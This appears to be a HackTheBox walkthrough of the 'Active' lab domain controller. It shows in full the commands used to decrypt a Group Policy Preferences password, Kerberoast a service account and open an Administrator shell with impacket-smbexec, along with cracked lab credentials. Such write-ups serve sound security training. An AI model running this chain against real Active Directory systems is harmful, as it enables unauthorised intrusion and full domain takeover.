+++
date = '2026-04-25T11:29:10-04:00'
draft = false
author = 'Siddhant Singh'
title = 'Active'
+++

Active is an easy-rated Windows box on HackTheBox. It's a domain controller running an older Windows Server 2008 R2 build, and the path is a classic AD two-step — a Group Policy Preferences password left on a world-readable SMB share hands over a service account, and that account's SPN makes it Kerberoastable straight to Administrator.

**Target:** `10.129.20.79`

---

## Enumeration

### NMAP

```
└─$ sudo nmap -sC -sV -p- -Pn 10.129.20.79  -max-retries 1
[sudo] password for xmen: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-04 15:10 -0400
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 1.01% done; ETC: 15:12 (0:01:38 remaining)
Warning: 10.129.20.79 giving up on port because retransmission cap hit (1).
Stats: 0:00:51 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 18.18% done; ETC: 15:12 (0:00:18 remaining)
Nmap scan report for 10.129.20.79
Host is up (0.044s latency).
Not shown: 65093 closed tcp ports (reset), 420 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-04 19:11:58Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  tcpwrapped
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49162/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-04-04T19:12:54
|_  start_date: 2026-04-04T19:09:33
|_clock-skew: 5s
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.27 seconds
```

Classic AD DC fingerprint — DNS (53), Kerberos (88), LDAP (389/3268), RPC, and SMB (445). LDAP confirms the domain is `active.htb` and the host is `DC`. Added `active.htb` to `/etc/hosts`.

---

## SMB — Null Session & Replication Share

SMB allowed a null bind, so I listed shares without credentials first:

```
└─$ smbclient -N -L ////10.129.20.79                      
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.20.79 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

`NETLOGON` and `SYSVOL` are standard DC shares. `Users` was behind auth. `Replication` stood out — it was wide open without credentials.

Browsing into `Replication` it mirrored a SYSVOL-like structure. Digging through it I found a `Groups.xml` file buried under:

```
\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\
```

The contents had a **Group Policy Preferences** user entry with a `cpassword` field for **`active.htb\SVC_TGS`**:

```
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
```

GPP passwords are encrypted with AES-256, but Microsoft [published the static AES key](https://adsecurity.org/?p=2288) used for all Group Policy Preferences encryption back in 2012. That makes every `cpassword` value in any GPP XML trivially decryptable. `gpp-decrypt` handles it in one shot:

```
┌──(xmen㉿kali)-[~/gpp-decrypt]
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

**Credentials:** `active.htb\SVC_TGS` / `GPPstillStandingStrong2k18`

---

## Foothold — SVC_TGS via SMB Users Share

With valid credentials for `SVC_TGS` I could now authenticate against the `Users` share, which is just the `C:\Users` directory. Inside the `SVC_TGS` home folder was `user.txt`.

---

## Privilege Escalation — Kerberoasting → Administrator

### GetUserSPNs

`SVC_TGS` is a domain account, so I could use its credentials as LDAP credentials to query for Service Principal Names. Any account with an SPN registered can be Kerberoasted — the DC will hand out a TGS ticket encrypted with that account's password hash.

```
impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.20.79 -request
```

The `active/CIFS` SPN came back, giving me a TGS ticket to crack offline. Ran it through John with `rockyou`:

```
Ticketmaster1968
```

That cracked straight away. The SPN belonged to the Administrator account, so I had domain admin credentials.

### Root

Got a shell as Administrator using `impacket-smbexec`:

```
┌──(xmen㉿kali)-[~]
└─$ impacket-smbexec active.htb/Administrator:Ticketmaster1968@active.htb
```
